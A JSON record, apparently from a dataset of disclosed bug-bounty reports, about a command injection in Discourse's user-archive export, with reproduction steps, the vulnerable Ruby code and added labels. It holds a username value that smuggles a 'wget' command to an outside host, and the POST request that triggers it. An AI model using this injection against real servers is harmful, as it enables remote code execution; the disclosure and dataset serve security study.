@@ -1,0 +1,73 @@
+{
+  "reported_to": "Discourse",
+  "reported_by": "ziot ",
+  "title": "Admin Command Injection via username in user_archive ExportCsvFile",
+  "content": "\nWhen a user generates a backup of their posts, their username gets sent to the ExportCsvFile job. The username is placed inside of a gzip command in backticks. Although the application prevents special characters in usernames, an admin is able to make modifications to the database via the restore from backup feature. This allows an admin to escalate to command injection.\nSteps\nLogin as an admin on try.discourse.org, e.g.\nhttp://try.discourse.org/\nMake a backup of the website and download it.\nExtract the contents of the archive.\nModify one of the usernames of an account you have access to:\ntest.txt;wget mrzioto.com\nRepackage the archive.\nUpload the modified archive.\nRestore from backup.\nLog into the account you just modified (you can login via email address, so the special characters won't prevent you from logging into it).\nSend the POST request for creating a user export archive:\nhttp://34.205.246.2/export_csv/export_entity.json\nPOST: entity_type=user&entity=user_archive\n---> You forced the server to make a wget leading to RCE/command injection.\nCode Flow\nCode 315 Bytes\n1      file_name_prefix = if @entity == \"user_archive\"\n2        \"#{@entity.split('_').join('-')}-#{@current_user.username}-#{Time.now.strftime(\"%y%m%d-%H%M%S\")}\"\n3\n4      file_name = \"#{file_name_prefix}-#{file.id}.csv\"\n5      absolute_path = \"#{UserExport.base_directory}/#{file_name}\"\n6\n7      `gzip -5 #{absolute_path}`\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": 512,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1494725100,
+  "report_url": "https://hackerone.com/reports/214022",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Login as an admin on try.discourse.org"
+    ],
+    [
+      2,
+      "Make a backup of the website and download it"
+    ],
+    [
+      3,
+      "Extract the contents of the archive"
+    ],
+    [
+      4,
+      "Modify one of the usernames of an account you have access to: test.txt;wget mrzioto.com"
+    ],
+    [
+      5,
+      "Repackage the archive"
+    ],
+    [
+      6,
+      "Upload the modified archive"
+    ],
+    [
+      7,
+      "Restore from backup"
+    ],
+    [
+      8,
+      "Log into the account you just modified (you can login via email address, so the special characters won't prevent you from logging into it)"
+    ],
+    [
+      9,
+      "Send the POST request for creating a user export archive: http://34.205.246.2/export_csv/export_entity.json POST: entity_type=user&entity=user_archive"
+    ]
+  ],
+  "vuln_description": "This vulnerability allows an admin to perform command injection via a modified username in a backup file. The username is used in a gzip command within backticks, and by restoring a backup with a malicious username, the admin can execute arbitrary commands on the server.",
+  "reason": "The attack involves multiple steps including backup manipulation, username modification, and restoring the backup to trigger command injection. The interaction between the backup restoration and the subsequent command execution is non-obvious and requires understanding of the application's internal workings.",
+  "new_complexity": "HIGH",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves command injection via username modification during backup restoration, which is an action performed by an admin user. The methodology described focuses on testing authorization boundaries by swapping user sessions and resource IDs, but this specific vulnerability requires modifying the backup file content (username) and restoring it, which is not covered by the standard (user_session, action, resource_id) tuple testing. The command injection occurs during the export process when the username is used in a system command, which is a different class of vulnerability (command injection) rather than an authorization bypass or IDOR.",
+    "is_detectable": false
+  }
+}
